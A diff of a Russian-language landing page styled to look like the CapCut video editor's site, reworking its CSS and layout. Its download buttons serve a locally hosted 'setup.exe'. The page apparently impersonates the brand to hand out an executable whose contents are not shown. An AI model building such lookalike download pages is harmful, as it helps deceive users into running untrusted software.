@@ -2,258 +2,166 @@
 <html lang="ru">
 <head>
   <meta charset="UTF-8" />
-  <meta name="viewport" content="width=device-width, initial-scale=1" />
-  <title>CapCut Download</title>
-  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@600;700&display=swap" rel="stylesheet" />
-  <link rel="icon" href="https://static.capcut.com/favicon.ico" type="image/x-icon" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>CapCut</title>
   <style>
-    body, html {
+    * {
       margin: 0;
       padding: 0;
+      box-sizing: border-box;
+    }
+
+    body, html {
       height: 100%;
-      font-family: 'Inter', sans-serif;
+      font-family: Arial, sans-serif;
       overflow: hidden;
-      background: black;
     }
 
-    #bg-video {
+    video {
       position: fixed;
       top: 0;
       left: 0;
-      width: 100vw;
-      height: 100vh;
+      width: 100%;
+      height: 100%;
       object-fit: cover;
-      z-index: -2;
+      z-index: -1;
     }
 
-    .overlay-dark {
+    .overlay {
       position: fixed;
       top: 0;
       left: 0;
-      width: 100vw;
-      height: 100vh;
-      background:
-        linear-gradient(to bottom, rgba(0, 0, 0, 0.9) 0%, transparent 40%),
-        linear-gradient(to right, rgba(0, 0, 0, 0.9) 0%, transparent 60%),
-        linear-gradient(to top, rgba(0, 0, 0, 0.9) 0%, transparent 40%);
-      z-index: -1;
+      width: 100%;
+      height: 100%;
       pointer-events: none;
     }
 
-    .navbar {
+    .overlay::before {
+      content: "";
       position: absolute;
-      top: 20px;
+      width: 100%;
+      height: 100%;
+      background: radial-gradient(circle at center, rgba(0,0,0,0) 40%, rgba(0,0,0,0.85) 85%);
+    }
+
+    .header {
+      position: absolute;
+      top: 30px;
       left: 40px;
       display: flex;
+      gap: 40px;
       align-items: center;
-      gap: 36px;
       z-index: 2;
-      font-size: 16px;
+    }
+
+    .header-item {
       color: white;
-      user-select: none;
-    }
-
-    .navbar .logo {
-      font-size: 28px;
-      font-weight: 700;
-    }
-
-    .navbar span {
-      cursor: pointer;
+      font-size: 16px;
       display: flex;
       align-items: center;
-      gap: 6px;
+      gap: 5px;
+      cursor: pointer;
     }
 
-    .navbar span::after {
-      content: "▼";
-      font-size: 10px;
+    .header-item:first-child {
+      font-size: 24px;
+      font-weight: bold;
+    }
+
+    .header-item svg {
+      width: 12px;
+      height: 12px;
     }
 
     .content {
-      position: relative;
-      z-index: 1;
-      height: 100vh;
-      display: flex;
-      flex-direction: column;
-      justify-content: center;
-      padding-left: 10%;
+      position: absolute;
+      top: 50%;
+      left: 40px;
+      transform: translateY(-50%);
       color: white;
-      max-width: 600px;
+      z-index: 2;
     }
 
-    .headline {
-      margin-bottom: 60px;
+    .content h1 {
+      font-size: 48px;
+      margin-bottom: 20px;
     }
 
-    .headline .line1 {
-      font-size: 72px;
-      font-weight: 700;
-      letter-spacing: 2px;
-      user-select: none;
-    }
-
-    .headline .line2 {
-      font-size: 36px;
-      font-weight: 700;
-      user-select: none;
-      background: linear-gradient(90deg, #00bfff, #40e0d0);
-      -webkit-background-clip: text;
-      -webkit-text-fill-color: transparent;
-      margin-top: -12px;
-    }
-
-    .headline .line3 {
-      color: #888888;
-      font-size: 16px;
-      margin-top: 16px;
-      user-select: none;
+    .content p {
+      font-size: 20px;
+      margin-bottom: 30px;
     }
 
     .btn-download {
-      margin-top: 50px;
-      background-color: #00f0ff;
-      color: #000;
-      font-weight: 700;
-      font-size: 20px;
-      padding: 16px 48px;
-      border-radius: 16px;
+      background: white;
+      color: black;
+      padding: 12px 30px;
+      font-size: 16px;
+      border-radius: 30px;
       text-decoration: none;
+      font-weight: bold;
       display: inline-block;
-      box-shadow: 0 8px 20px rgba(0, 240, 255, 0.5);
-      transition: background-color 0.3s ease, transform 0.2s;
-      user-select: none;
-      cursor: pointer;
-      width: fit-content;
-      animation: pulse 2.5s infinite;
     }
 
-    .btn-download:hover {
-      background-color: #00d2e0;
-      transform: translateY(-3px);
-      box-shadow: 0 12px 28px rgba(0, 210, 224, 0.7);
-      animation-play-state: paused;
-    }
-
-    .header-buttons {
+    .top-right {
       position: absolute;
-      top: 20px;
-      right: 20px;
+      top: 40px;
+      right: 40px;
       display: flex;
       align-items: center;
       gap: 20px;
       z-index: 2;
     }
 
-    .help-icon {
-      width: 36px;
-      height: 36px;
-      border: 2px solid white;
+    .question-circle {
+      width: 32px;
+      height: 32px;
       border-radius: 50%;
+      border: 2px solid white;
       color: white;
-      font-size: 18px;
+      text-align: center;
+      line-height: 28px;
       font-weight: bold;
-      display: flex;
-      align-items: center;
-      justify-content: center;
-      cursor: pointer;
+      font-size: 18px;
       background-color: transparent;
-      user-select: none;
     }
 
-    .header-download {
-      background-color: #00f0ff;
-      color: #000;
-      font-weight: 700;
+    .btn-secondary {
+      background: white;
+      color: black;
+      padding: 10px 20px;
       font-size: 16px;
-      padding: 10px 24px;
-      border-radius: 16px;
+      border-radius: 30px;
       text-decoration: none;
-      box-shadow: 0 6px 16px rgba(0, 240, 255, 0.4);
-      transition: background-color 0.3s ease, transform 0.2s;
-      user-select: none;
-      cursor: pointer;
-    }
-
-    .header-download:hover {
-      background-color: #00d2e0;
-      transform: translateY(-2px);
-    }
-
-    .footer {
-      position: absolute;
-      bottom: 20px;
-      left: 50%;
-      transform: translateX(-50%);
-      font-size: 14px;
-      color: #888;
-      user-select: none;
-      z-index: 2;
-    }
-
-    @keyframes pulse {
-      0%, 100% {
-        box-shadow: 0 8px 20px rgba(0, 240, 255, 0.5);
-        transform: translateY(0);
-      }
-      50% {
-        box-shadow: 0 14px 30px rgba(0, 240, 255, 0.8);
-        transform: translateY(-4px);
-      }
-    }
-
-    @media (max-width: 480px) {
-      .btn-download {
-        font-size: 18px;
-        padding: 14px 36px;
-      }
-      .footer {
-        font-size: 12px;
-      }
-      .headline .line1 {
-        font-size: 48px;
-      }
-      .headline .line2 {
-        font-size: 24px;
-      }
-      .headline .line3 {
-        font-size: 14px;
-      }
+      font-weight: bold;
     }
   </style>
 </head>
 <body>
-
-  <video autoplay muted loop id="bg-video">
+  <video autoplay muted loop playsinline>
     <source src="background.mp4" type="video/mp4" />
-    Ваш браузер не поддерживает HTML5 видео.
+    Ваш браузер не поддерживает видео.
   </video>
 
-  <div class="overlay-dark"></div>
+  <div class="overlay"></div>
 
-  <div class="navbar">
-    <div class="logo">CapCut</div>
-    <span>Товары</span>
-    <span>Решения</span>
-    <span>Ресурсы</span>
-    <span>Скачать</span>
-  </div>
-
-  <div class="header-buttons">
-    <div class="help-icon">?</div>
-    <a href="#" class="header-download">Скачать</a>
+  <div class="header">
+    <div class="header-item" style="font-size: 36px;">CapCut</div>
+    <div class="header-item">Товары <span>▼</span></div>
+    <div class="header-item">Решения <span>▼</span></div>
+    <div class="header-item">Ресурсы <span>▼</span></div>
+    <div class="header-item">Скачать <span>▼</span></div>
   </div>
 
   <div class="content">
-    <div class="headline">
-      <div class="line1">Выведите свои видео</div>
-      <div class="line2">на новый уровень</div>
-      <div class="line3">Будущее видеомонтажа уже здесь: мощные ИИ-функции помогут создавать незабываемые визуальные шедевры.</div>
-    </div>
-    <a href="files/setup.exe" download class="btn-download">Скачать бесплатно</a>
+    <h1>Выведите свои видео на новый уровень</h1>
+    <p>Редактируйте как профессионал с CapCut — всё, что нужно, в одном месте.</p>
+    <a href="setup.exe" download class="btn-download">Скачать бесплатно</a>
   </div>
 
-  <div class="footer">© 2024 CapCut. Все права защищены.</div>
-
+  <div class="top-right">
+    <div class="question-circle">?</div>
+    <a href="setup.exe" download class="btn-secondary">Скачать</a>
+  </div>
 </body>
 </html>
